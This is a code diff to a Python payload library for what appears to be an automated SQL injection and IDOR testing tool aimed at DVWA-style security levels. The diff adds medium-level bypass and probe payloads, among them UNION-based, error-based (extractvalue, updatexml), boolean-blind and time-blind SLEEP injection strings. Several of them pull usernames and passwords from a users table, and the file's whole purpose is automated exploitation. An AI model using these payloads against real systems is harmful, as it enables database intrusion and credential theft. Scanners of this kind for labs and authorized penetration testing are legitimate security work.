@@ -15,11 +15,14 @@ class PayloadSet:
         exploit: Exploitation payloads used when a vulnerability is confirmed.
         bypass: Security-level–specific bypass payloads. Keyed by level name
             (``"low"``, ``"medium"``, ``"high"``).
+        probe_by_level: Additional level-specific detection payloads keyed by
+            security level.
     """
 
     probe: list[str] = field(default_factory=list)
     exploit: list[str] = field(default_factory=list)
     bypass: dict[str, list[str]] = field(default_factory=dict)
+    probe_by_level: dict[str, list[str]] = field(default_factory=dict)
 
 
 @dataclass(frozen=True)
@@ -44,27 +47,40 @@ class PayloadLibrary:
             probe=["1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' UNION SELECT null,null-- -"],
             exploit=["1' UNION SELECT user,password FROM users-- -"],
             bypass={
-                "medium": ["1 UNION SELECT user,password FROM users#"],
+                "medium": [
+                    "1 UNION SELECT user,password FROM users#",
+                    "1 UNION SELECT null,null#",
+                    "1 UNION SELECT user,password FROM users LIMIT 1#",
+                ],
                 "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
             },
+            probe_by_level={"medium": ["1 UNION SELECT null,null"]},
         ),
         "sqli_error": PayloadSet(
             probe=["1'", "1''", "1\\'"],
             exploit=["1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
                      "1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users-- -"],
             bypass={
-                "medium": ["1 AND extractvalue(1,concat(0x7e,(SELECT database())))#"],
+                "medium": [
+                    "1 AND extractvalue(1,concat(0x7e,(SELECT database())))#",
+                    "1' AND updatexml(1,concat(0x7e,(SELECT user FROM users LIMIT 1)),1)#",
+                ],
                 "high": ["1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users LIMIT 1-- -"],
             },
+            probe_by_level={"medium": ["1 AND"]},
         ),
         "sqli_boolean_blind": PayloadSet(
             probe=["1' AND 1=1-- -", "1' AND 1=2-- -"],
             exploit=["1' AND ASCII(SUBSTR(database(),1,1))>77-- -",
                      "1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77-- -"],
             bypass={
-                "medium": ["1 AND ASCII(SUBSTR(database(),1,1))>77#"],
+                "medium": [
+                    "1 AND ASCII(SUBSTR(database(),1,1))>77#",
+                    "1 AND ASCII(SUBSTR((SELECT database()),1,1))>64#",
+                ],
                 "high": ["1'/**/AND/**/ASCII(SUBSTR(database(),1,1))>77-- -"],
             },
+            probe_by_level={"medium": ["1 AND 1=1", "1 AND 1=2"]},
         ),
         "sqli_time_blind": PayloadSet(
             probe=["1' AND SLEEP(3)-- -"],
@@ -73,9 +89,13 @@ class PayloadLibrary:
                 "1' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(3),0)-- -",
             ],
             bypass={
-                "medium": ["1 AND SLEEP(3)#"],
+                "medium": [
+                    "1 AND SLEEP(3)#",
+                    "1 AND IF(1=1,SLEEP(3),0)#",
+                ],
                 "high": ["1'/**/AND/**/SLEEP(3)-- -"],
             },
+            probe_by_level={"medium": ["1 AND SLEEP(3)"]},
         ),
         "ac_idor": PayloadSet(
             probe=["1", "2", "3"],
@@ -142,17 +162,32 @@ class PayloadLibrary:
             for level, values in payload_set.bypass.items()
             if isinstance(level, str)
         }
+        probe_by_level_copy = {
+            level: list(values)
+            for level, values in payload_set.probe_by_level.items()
+            if isinstance(level, str)
+        }
         # Ensure the requested level key always exists for simple consumers.
         bypass_copy.setdefault(normalized_level, list(payload_set.bypass.get(normalized_level, [])))
+        probe_by_level_copy.setdefault(
+            normalized_level,
+            list(payload_set.probe_by_level.get(normalized_level, [])),
+        )
 
         return PayloadSet(
             probe=list(payload_set.probe),
             exploit=list(payload_set.exploit),
             bypass=bypass_copy,
+            probe_by_level=probe_by_level_copy,
         )
 
     def load_seed_candidates(self, method: str, security_level: str = "low") -> list[dict]:
-        """Return static payloads as validator-ready candidate dictionaries."""
+        """Return level-scoped static payloads as validator-ready candidates.
+
+        Security-level bypass seeds are included only for the requested level;
+        this keeps medium-specific evidence fixes from changing high-level
+        execution behavior.
+        """
         normalized_level = security_level.lower().strip()
         if normalized_level not in _SECURITY_LEVELS:
             normalized_level = "low"
@@ -161,6 +196,7 @@ class PayloadLibrary:
         rows.extend(("probe", payload) for payload in payload_set.probe)
         rows.extend(("exploit", payload) for payload in payload_set.exploit)
         rows.extend(("bypass", payload) for payload in payload_set.bypass.get(normalized_level, []))
+        rows.extend(("probe", payload) for payload in payload_set.probe_by_level.get(normalized_level, []))
 
         candidates: list[dict] = []
         seen_payloads: set[str] = set()
